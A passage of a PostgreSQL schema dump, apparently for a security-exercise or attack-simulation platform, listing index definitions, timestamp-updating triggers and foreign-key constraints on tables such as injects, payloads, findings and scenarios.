CREATE INDEX idx_executors ON public.executors USING btree (executor_id);


--
-- Name: idx_exercises_documents_document; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_exercises_documents_document ON public.exercises_documents USING btree (document_id);


--
-- Name: idx_exercises_documents_inject; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_exercises_documents_inject ON public.exercises_documents USING btree (exercise_id);


--
-- Name: idx_exercises_teams_exercise; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_exercises_teams_exercise ON public.exercises_teams USING btree (exercise_id);


--
-- Name: idx_exercises_teams_team; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_exercises_teams_team ON public.exercises_teams USING btree (team_id);


--
-- Name: idx_exercises_teams_users_exercise; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_exercises_teams_users_exercise ON public.exercises_teams_users USING btree (exercise_id);


--
-- Name: idx_exercises_teams_users_team; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_exercises_teams_users_team ON public.exercises_teams_users USING btree (team_id);


--
-- Name: idx_exercises_teams_users_user; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_exercises_teams_users_user ON public.exercises_teams_users USING btree (user_id);


--
-- Name: idx_f08fc65c9cfd383c; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_f08fc65c9cfd383c ON public.logs USING btree (log_user);


--
-- Name: idx_f08fc65cc0891ec3; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_f08fc65cc0891ec3 ON public.logs USING btree (log_exercise);


--
-- Name: idx_ff8ab7e0a76ed395; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_ff8ab7e0a76ed395 ON public.users_groups USING btree (user_id);


--
-- Name: idx_ff8ab7e0fe54d947; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_ff8ab7e0fe54d947 ON public.users_groups USING btree (group_id);


--
-- Name: idx_finding_inject; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_finding_inject ON public.findings USING btree (finding_inject_id);


--
-- Name: idx_findings_tags_finding; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_findings_tags_finding ON public.findings_tags USING btree (finding_id);


--
-- Name: idx_findings_tags_tag; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_findings_tags_tag ON public.findings_tags USING btree (tag_id);


--
-- Name: idx_fingings_assets_asset; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_fingings_assets_asset ON public.findings_assets USING btree (asset_id);


--
-- Name: idx_fingings_assets_finding; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_fingings_assets_finding ON public.findings_assets USING btree (finding_id);


--
-- Name: idx_fingings_teams_finding; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_fingings_teams_finding ON public.findings_teams USING btree (finding_id);


--
-- Name: idx_fingings_teams_team; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_fingings_teams_team ON public.findings_teams USING btree (team_id);


--
-- Name: idx_fingings_users_finding; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_fingings_users_finding ON public.findings_users USING btree (finding_id);


--
-- Name: idx_fingings_users_user; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_fingings_users_user ON public.findings_users USING btree (user_id);


--
-- Name: idx_flag_challenge; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_flag_challenge ON public.challenges_flags USING btree (flag_challenge);


--
-- Name: idx_grant_resource; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_grant_resource ON public.grants USING btree (grant_resource);


--
-- Name: idx_grant_resource_type; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_grant_resource_type ON public.grants USING btree (grant_resource_type);


--
-- Name: idx_grant_resource_type_resource; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_grant_resource_type_resource ON public.grants USING btree (grant_resource_type, grant_resource);


--
-- Name: idx_import_mappers; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_import_mappers ON public.import_mappers USING btree (mapper_id);


--
-- Name: idx_indexing_status_type; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_indexing_status_type ON public.indexing_status USING btree (indexing_status_type);


--
-- Name: idx_inject_expectation_agent_id; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_inject_expectation_agent_id ON public.injects_expectations USING btree (agent_id);


--
-- Name: idx_inject_expectation_asset_group_id; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_inject_expectation_asset_group_id ON public.injects_expectations USING btree (asset_group_id);


--
-- Name: idx_inject_expectation_asset_id; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_inject_expectation_asset_id ON public.injects_expectations USING btree (asset_id);


--
-- Name: idx_inject_expectation_exercise_id; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_inject_expectation_exercise_id ON public.injects_expectations USING btree (exercise_id);


--
-- Name: idx_inject_expectation_inject_id; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_inject_expectation_inject_id ON public.injects_expectations USING btree (inject_id);


--
-- Name: idx_inject_expectation_team_id; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_inject_expectation_team_id ON public.injects_expectations USING btree (team_id);


--
-- Name: idx_inject_expectation_trace_expectation; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_inject_expectation_trace_expectation ON public.injects_expectations_traces USING btree (inject_expectation_trace_expectation);


--
-- Name: idx_inject_expectation_trace_source_id; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_inject_expectation_trace_source_id ON public.injects_expectations_traces USING btree (inject_expectation_trace_source_id);


--
-- Name: idx_inject_expectation_user_id; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_inject_expectation_user_id ON public.injects_expectations USING btree (user_id);


--
-- Name: idx_inject_importers; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_inject_importers ON public.inject_importers USING btree (importer_id);


--
-- Name: idx_inject_importers_injector_contracts; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_inject_importers_injector_contracts ON public.inject_importers USING btree (importer_injector_contract_id);


--
-- Name: idx_inject_inject_injector_contract; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_inject_inject_injector_contract ON public.injects USING btree (inject_injector_contract);


--
-- Name: idx_inject_test_inject; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_inject_test_inject ON public.injects_tests_statuses USING btree (status_inject);


--
-- Name: idx_injector_contract_injector; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_injector_contract_injector ON public.injectors_contracts USING btree (injector_id);


--
-- Name: idx_injectors; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_injectors ON public.injectors USING btree (injector_id);


--
-- Name: idx_injectors_contracts; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_injectors_contracts ON public.injectors_contracts USING btree (injector_contract_id);


--
-- Name: idx_injectors_contracts_attack_patterns_contract; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_injectors_contracts_attack_patterns_contract ON public.injectors_contracts_attack_patterns USING btree (injector_contract_id);


--
-- Name: idx_injectors_contracts_attack_patterns_pattern; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_injectors_contracts_attack_patterns_pattern ON public.injectors_contracts_attack_patterns USING btree (attack_pattern_id);


--
-- Name: idx_injectors_contracts_vulnerabilities_contract; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_injectors_contracts_vulnerabilities_contract ON public.injectors_contracts_vulnerabilities USING btree (injector_contract_id);


--
-- Name: idx_injectors_contracts_vulnerabilities_vuln; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_injectors_contracts_vulnerabilities_vuln ON public.injectors_contracts_vulnerabilities USING btree (vulnerability_id);


--
-- Name: idx_injects_asset_groups_asset_groups; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_injects_asset_groups_asset_groups ON public.injects_asset_groups USING btree (asset_group_id);


--
-- Name: idx_injects_asset_groups_inject; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_injects_asset_groups_inject ON public.injects_asset_groups USING btree (inject_id);


--
-- Name: idx_injects_assets_asset; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_injects_assets_asset ON public.injects_assets USING btree (asset_id);


--
-- Name: idx_injects_assets_inject; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_injects_assets_inject ON public.injects_assets USING btree (inject_id);


--
-- Name: idx_injects_dependencies; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_injects_dependencies ON public.injects_dependencies USING btree (inject_children_id);


--
-- Name: idx_injects_documents_document; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_injects_documents_document ON public.injects_documents USING btree (document_id);


--
-- Name: idx_injects_documents_inject; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_injects_documents_inject ON public.injects_documents USING btree (inject_id);


--
-- Name: idx_kill_chain_phases; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_kill_chain_phases ON public.kill_chain_phases USING btree (phase_id);


--
-- Name: idx_kill_chain_phases_stix_id; Type: INDEX; Schema: public; Owner: user
--

CREATE UNIQUE INDEX idx_kill_chain_phases_stix_id ON public.kill_chain_phases USING btree (phase_stix_id);


--
-- Name: idx_lessons_answer_question; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_lessons_answer_question ON public.lessons_answers USING btree (lessons_answer_question);


--
-- Name: idx_lessons_answer_user; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_lessons_answer_user ON public.lessons_answers USING btree (lessons_answer_user);


--
-- Name: idx_lessons_answers; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_lessons_answers ON public.lessons_answers USING btree (lessons_answer_id);


--
-- Name: idx_lessons_categories; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_lessons_categories ON public.lessons_categories USING btree (lessons_category_id);


--
-- Name: idx_lessons_categories_audiences_audience; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_lessons_categories_audiences_audience ON public.lessons_categories_teams USING btree (team_id);


--
-- Name: idx_lessons_categories_audiences_category; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_lessons_categories_audiences_category ON public.lessons_categories_teams USING btree (lessons_category_id);


--
-- Name: idx_lessons_category_exercise; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_lessons_category_exercise ON public.lessons_categories USING btree (lessons_category_exercise);


--
-- Name: idx_lessons_question_category; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_lessons_question_category ON public.lessons_questions USING btree (lessons_question_category);


--
-- Name: idx_lessons_questions; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_lessons_questions ON public.lessons_questions USING btree (lessons_question_id);


--
-- Name: idx_lessons_template_categories; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_lessons_template_categories ON public.lessons_template_categories USING btree (lessons_template_category_id);


--
-- Name: idx_lessons_template_category_template; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_lessons_template_category_template ON public.lessons_template_categories USING btree (lessons_template_category_template);


--
-- Name: idx_lessons_template_question_category; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_lessons_template_question_category ON public.lessons_template_questions USING btree (lessons_template_question_category);


--
-- Name: idx_lessons_template_questions; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_lessons_template_questions ON public.lessons_template_questions USING btree (lessons_template_question_id);


--
-- Name: idx_lessons_templates; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_lessons_templates ON public.lessons_templates USING btree (lessons_template_id);


--
-- Name: idx_mitigations; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_mitigations ON public.mitigations USING btree (mitigation_id);


--
-- Name: idx_mitigations_attack_patterns_attack_pattern; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_mitigations_attack_patterns_attack_pattern ON public.mitigations_attack_patterns USING btree (attack_pattern_id);


--
-- Name: idx_mitigations_attack_patterns_mitigation; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_mitigations_attack_patterns_mitigation ON public.mitigations_attack_patterns USING btree (mitigation_id);


--
-- Name: idx_null_exercise_and_scenario; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_null_exercise_and_scenario ON public.injects USING btree (inject_id) WHERE ((inject_scenario IS NULL) AND (inject_exercise IS NULL));


--
-- Name: idx_pauses; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_pauses ON public.pauses USING btree (pause_id);


--
-- Name: idx_payloads; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_payloads ON public.payloads USING btree (payload_id);


--
-- Name: idx_payloads_attack_patterns_contract; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_payloads_attack_patterns_contract ON public.payloads_attack_patterns USING btree (payload_id);


--
-- Name: idx_payloads_attack_patterns_pattern; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_payloads_attack_patterns_pattern ON public.payloads_attack_patterns USING btree (attack_pattern_id);


--
-- Name: idx_payloads_tags_payload; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_payloads_tags_payload ON public.payloads_tags USING btree (payload_id);


--
-- Name: idx_payloads_tags_tag; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_payloads_tags_tag ON public.payloads_tags USING btree (tag_id);


--
-- Name: idx_pg_trgm_asset_groups_asset_group_name; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_pg_trgm_asset_groups_asset_group_name ON public.asset_groups USING gin (to_tsvector('simple'::regconfig, (asset_group_name)::text));


--
-- Name: idx_pg_trgm_assets_asset_name; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_pg_trgm_assets_asset_name ON public.assets USING gin (to_tsvector('simple'::regconfig, (asset_name)::text));


--
-- Name: idx_pg_trgm_exercises_exercise_name; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_pg_trgm_exercises_exercise_name ON public.exercises USING gin (to_tsvector('simple'::regconfig, (exercise_name)::text));


--
-- Name: idx_pg_trgm_organizations_organization_name; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_pg_trgm_organizations_organization_name ON public.organizations USING gin (to_tsvector('simple'::regconfig, (organization_name)::text));


--
-- Name: idx_pg_trgm_scenarios_scenario_name; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_pg_trgm_scenarios_scenario_name ON public.scenarios USING gin (to_tsvector('simple'::regconfig, (scenario_name)::text));


--
-- Name: idx_pg_trgm_teams_team_name; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_pg_trgm_teams_team_name ON public.teams USING gin (to_tsvector('simple'::regconfig, (team_name)::text));


--
-- Name: idx_pg_trgm_users_user_email; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_pg_trgm_users_user_email ON public.users USING gin (to_tsvector('simple'::regconfig, (user_email)::text));


--
-- Name: idx_report_informations; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_report_informations ON public.report_informations USING btree (report_id);


--
-- Name: idx_report_inject_comment_inject; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_report_inject_comment_inject ON public.report_inject_comment USING btree (report_id);


--
-- Name: idx_report_inject_comment_report; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_report_inject_comment_report ON public.report_inject_comment USING btree (inject_id);


--
-- Name: idx_reports; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_reports ON public.reports USING btree (report_id);


--
-- Name: idx_reports_exercises_exercise; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_reports_exercises_exercise ON public.reports_exercises USING btree (exercise_id);


--
-- Name: idx_reports_exercises_report; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_reports_exercises_report ON public.reports_exercises USING btree (report_id);


--
-- Name: idx_resource_id; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_resource_id ON public.notification_rules USING btree (notification_resource_id);


--
-- Name: idx_rule_attributes; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_rule_attributes ON public.rule_attributes USING btree (attribute_id);


--
-- Name: idx_rule_attributes_inject_importers; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_rule_attributes_inject_importers ON public.rule_attributes USING btree (attribute_inject_importer_id);


--
-- Name: idx_scenario_exercise_exercise; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_scenario_exercise_exercise ON public.scenarios_exercises USING btree (exercise_id);


--
-- Name: idx_scenario_exercise_scenario; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_scenario_exercise_scenario ON public.scenarios_exercises USING btree (scenario_id);


--
-- Name: idx_scenarios_documents_document; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_scenarios_documents_document ON public.scenarios_documents USING btree (document_id);


--
-- Name: idx_scenarios_documents_scenario; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_scenarios_documents_scenario ON public.scenarios_documents USING btree (scenario_id);


--
-- Name: idx_scenarios_teams_scenario; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_scenarios_teams_scenario ON public.scenarios_teams USING btree (scenario_id);


--
-- Name: idx_scenarios_teams_team; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_scenarios_teams_team ON public.scenarios_teams USING btree (team_id);


--
-- Name: idx_scenarios_teams_users_scenario; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_scenarios_teams_users_scenario ON public.scenarios_teams_users USING btree (scenario_id);


--
-- Name: idx_scenarios_teams_users_team; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_scenarios_teams_users_team ON public.scenarios_teams_users USING btree (team_id);


--
-- Name: idx_scenarios_teams_users_user; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_scenarios_teams_users_user ON public.scenarios_teams_users USING btree (user_id);


--
-- Name: idx_tag_id; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_tag_id ON public.tag_rules USING btree (tag_id);


--
-- Name: idx_teams; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_teams ON public.teams USING btree (team_id);


--
-- Name: idx_users_organization; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_users_organization ON public.users USING btree (user_organization);


--
-- Name: idx_users_teams_team; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_users_teams_team ON public.users_teams USING btree (team_id);


--
-- Name: idx_users_teams_user; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_users_teams_user ON public.users_teams USING btree (user_id);


--
-- Name: idx_users_user_email_lower_case; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_users_user_email_lower_case ON public.users USING btree (lower((user_email)::text));


--
-- Name: idx_variable_exercise; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_variable_exercise ON public.variables USING btree (variable_exercise);


--
-- Name: idx_variable_scenario; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_variable_scenario ON public.variables USING btree (variable_scenario);


--
-- Name: idx_vulnerabilities_cvss; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_vulnerabilities_cvss ON public.vulnerabilities USING btree (vulnerability_cvss_v31);


--
-- Name: idx_vulnerabilities_cwes_cwe_id; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_vulnerabilities_cwes_cwe_id ON public.vulnerabilities_cwes USING btree (cwe_id);


--
-- Name: idx_vulnerabilities_cwes_vulnerability_id; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_vulnerabilities_cwes_vulnerability_id ON public.vulnerabilities_cwes USING btree (vulnerability_id);


--
-- Name: idx_vulnerabilities_published; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_vulnerabilities_published ON public.vulnerabilities USING btree (vulnerability_published);


--
-- Name: idx_vulnerability_reference_urls_vulnerability_id; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_vulnerability_reference_urls_vulnerability_id ON public.vulnerability_reference_urls USING btree (vulnerability_id);


--
-- Name: injector_contract_payload_unique; Type: INDEX; Schema: public; Owner: user
--

CREATE UNIQUE INDEX injector_contract_payload_unique ON public.injectors_contracts USING btree (injector_contract_payload, injector_id);


--
-- Name: injectors_unique; Type: INDEX; Schema: public; Owner: user
--

CREATE UNIQUE INDEX injectors_unique ON public.injectors USING btree (injector_type);


--
-- Name: kill_chain_phases_unique; Type: INDEX; Schema: public; Owner: user
--

CREATE UNIQUE INDEX kill_chain_phases_unique ON public.kill_chain_phases USING btree (phase_name, phase_kill_chain_name);


--
-- Name: migrations_s_idx; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX migrations_s_idx ON public.migrations USING btree (success);


--
-- Name: mitigations_unique; Type: INDEX; Schema: public; Owner: user
--

CREATE UNIQUE INDEX mitigations_unique ON public.mitigations USING btree (mitigation_external_id);


--
-- Name: payloads_unique; Type: INDEX; Schema: public; Owner: user
--

CREATE UNIQUE INDEX payloads_unique ON public.payloads USING btree (payload_external_id);


--
-- Name: tag_name_unique; Type: INDEX; Schema: public; Owner: user
--

CREATE UNIQUE INDEX tag_name_unique ON public.tags USING btree (tag_name);


--
-- Name: tokens_value_unique; Type: INDEX; Schema: public; Owner: user
--

CREATE UNIQUE INDEX tokens_value_unique ON public.tokens USING btree (token_value);


--
-- Name: uniq_658a47a864e0dbd; Type: INDEX; Schema: public; Owner: user
--

CREATE UNIQUE INDEX uniq_658a47a864e0dbd ON public.injects_statuses USING btree (status_inject);


--
-- Name: users_email_unique; Type: INDEX; Schema: public; Owner: user
--

CREATE UNIQUE INDEX users_email_unique ON public.users USING btree (user_email);


--
-- Name: findings_assets after_delete_update_asset_updated_at; Type: TRIGGER; Schema: public; Owner: user
--

CREATE TRIGGER after_delete_update_asset_updated_at AFTER DELETE ON public.findings_assets FOR EACH ROW EXECUTE FUNCTION public.update_asset_updated_at_after_delete_finding();


--
-- Name: injects_assets after_delete_update_asset_updated_at; Type: TRIGGER; Schema: public; Owner: user
--

CREATE TRIGGER after_delete_update_asset_updated_at AFTER DELETE ON public.injects_assets FOR EACH ROW EXECUTE FUNCTION public.update_asset_updated_at_after_delete_inject();


--
-- Name: exercises_teams after_delete_update_exercise_updated_at; Type: TRIGGER; Schema: public; Owner: user
--

CREATE TRIGGER after_delete_update_exercise_updated_at AFTER DELETE ON public.exercises_teams FOR EACH ROW EXECUTE FUNCTION public.update_exercise_updated_at_after_delete_team();


--
-- Name: injects_dependencies after_delete_update_inject_updated_at; Type: TRIGGER; Schema: public; Owner: user
--

CREATE TRIGGER after_delete_update_inject_updated_at AFTER DELETE ON public.injects_dependencies FOR EACH ROW EXECUTE FUNCTION public.update_inject_updated_at_after_delete_inject_child();


--
-- Name: injects_teams after_delete_update_inject_updated_at; Type: TRIGGER; Schema: public; Owner: user
--

CREATE TRIGGER after_delete_update_inject_updated_at AFTER DELETE ON public.injects_teams FOR EACH ROW EXECUTE FUNCTION public.update_inject_updated_at_after_delete_team();


--
-- Name: injectors_contracts_attack_patterns after_delete_update_injector_contract_updated_at; Type: TRIGGER; Schema: public; Owner: user
--

CREATE TRIGGER after_delete_update_injector_contract_updated_at AFTER DELETE ON public.injectors_contracts_attack_patterns FOR EACH ROW EXECUTE FUNCTION public.update_injector_contract_updated_at();


--
-- Name: injectors_contracts_vulnerabilities after_delete_update_injector_contract_updated_at; Type: TRIGGER; Schema: public; Owner: user
--

CREATE TRIGGER after_delete_update_injector_contract_updated_at AFTER DELETE ON public.injectors_contracts_vulnerabilities FOR EACH ROW EXECUTE FUNCTION public.update_injector_contract_updated_at();


--
-- Name: scenarios_teams after_delete_update_scenario_updated_at; Type: TRIGGER; Schema: public; Owner: user
--

CREATE TRIGGER after_delete_update_scenario_updated_at AFTER DELETE ON public.scenarios_teams FOR EACH ROW EXECUTE FUNCTION public.update_scenario_updated_at_after_delete_team();


--
-- Name: exercises after_insert_exercise; Type: TRIGGER; Schema: public; Owner: user
--

CREATE TRIGGER after_insert_exercise AFTER INSERT ON public.exercises FOR EACH ROW EXECUTE FUNCTION public.update_launch_order_trigger();


--
-- Name: injectors_contracts_attack_patterns after_insert_update_injector_contract_updated_at; Type: TRIGGER; Schema: public; Owner: user
--

CREATE TRIGGER after_insert_update_injector_contract_updated_at AFTER INSERT ON public.injectors_contracts_attack_patterns FOR EACH ROW EXECUTE FUNCTION public.update_injector_contract_updated_at();


--
-- Name: injectors_contracts_vulnerabilities after_insert_update_injector_contract_updated_at; Type: TRIGGER; Schema: public; Owner: user
--

CREATE TRIGGER after_insert_update_injector_contract_updated_at AFTER INSERT ON public.injectors_contracts_vulnerabilities FOR EACH ROW EXECUTE FUNCTION public.update_injector_contract_updated_at();


--
-- Name: exercises after_update_exercise_start_date; Type: TRIGGER; Schema: public; Owner: user
--

CREATE TRIGGER after_update_exercise_start_date AFTER UPDATE OF exercise_start_date ON public.exercises FOR EACH ROW EXECUTE FUNCTION public.update_launch_order_trigger();


--
-- Name: scenarios trg_delete_scenario_notification_rules; Type: TRIGGER; Schema: public; Owner: user
--

CREATE TRIGGER trg_delete_scenario_notification_rules AFTER DELETE ON public.scenarios FOR EACH ROW EXECUTE FUNCTION public.delete_notification_rules_for_scenario();


--
-- Name: agents agent_asset_id_fk; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.agents
    ADD CONSTRAINT agent_asset_id_fk FOREIGN KEY (agent_asset) REFERENCES public.assets(asset_id) ON DELETE CASCADE;


--
-- Name: agents agent_executor_id_fk; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.agents
    ADD CONSTRAINT agent_executor_id_fk FOREIGN KEY (agent_executor) REFERENCES public.executors(executor_id) ON DELETE CASCADE;


--
-- Name: agents agent_inject_id_fk; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.agents
    ADD CONSTRAINT agent_inject_id_fk FOREIGN KEY (agent_inject) REFERENCES public.injects(inject_id) ON DELETE CASCADE;


--
-- Name: agents agent_parent_id_fk; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.agents
    ADD CONSTRAINT agent_parent_id_fk FOREIGN KEY (agent_parent) REFERENCES public.agents(agent_id) ON DELETE CASCADE;


--
-- Name: asset_agent_jobs asset_agent_agent_fk; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.asset_agent_jobs
    ADD CONSTRAINT asset_agent_agent_fk FOREIGN KEY (asset_agent_agent) REFERENCES public.agents(agent_id) ON DELETE CASCADE;


--
-- Name: asset_agent_jobs asset_agent_inject_fk; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.asset_agent_jobs
    ADD CONSTRAINT asset_agent_inject_fk FOREIGN KEY (asset_agent_inject) REFERENCES public.injects(inject_id) ON DELETE CASCADE;


--
-- Name: asset_groups_assets asset_group_id_fk; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.asset_groups_assets
    ADD CONSTRAINT asset_group_id_fk FOREIGN KEY (asset_group_id) REFERENCES public.asset_groups(asset_group_id) ON DELETE CASCADE;


--
-- Name: asset_groups_tags asset_group_id_fk; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.asset_groups_tags
    ADD CONSTRAINT asset_group_id_fk FOREIGN KEY (asset_group_id) REFERENCES public.asset_groups(asset_group_id) ON DELETE CASCADE;


--
-- Name: injects_asset_groups asset_group_id_fk; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.injects_asset_groups
    ADD CONSTRAINT asset_group_id_fk FOREIGN KEY (asset_group_id) REFERENCES public.asset_groups(asset_group_id) ON DELETE CASCADE;


--
-- Name: tag_rule_asset_groups asset_group_id_fk; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.tag_rule_asset_groups
    ADD CONSTRAINT asset_group_id_fk FOREIGN KEY (asset_group_id) REFERENCES public.asset_groups(asset_group_id) ON DELETE CASCADE;


--
-- Name: asset_groups_assets asset_id_fk; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.asset_groups_assets
    ADD CONSTRAINT asset_id_fk FOREIGN KEY (asset_id) REFERENCES public.assets(asset_id) ON DELETE CASCADE;


--
-- Name: assets_tags asset_id_fk; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.assets_tags
    ADD CONSTRAINT asset_id_fk FOREIGN KEY (asset_id) REFERENCES public.assets(asset_id) ON DELETE CASCADE;


--
-- Name: findings_assets asset_id_fk; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.findings_assets
    ADD CONSTRAINT asset_id_fk FOREIGN KEY (asset_id) REFERENCES public.assets(asset_id) ON DELETE CASCADE;


--
-- Name: injects_assets asset_id_fk; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.injects_assets
    ADD CONSTRAINT asset_id_fk FOREIGN KEY (asset_id) REFERENCES public.assets(asset_id) ON DELETE CASCADE;


--
-- Name: injectors_contracts_attack_patterns attack_pattern_id_fk; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.injectors_contracts_attack_patterns
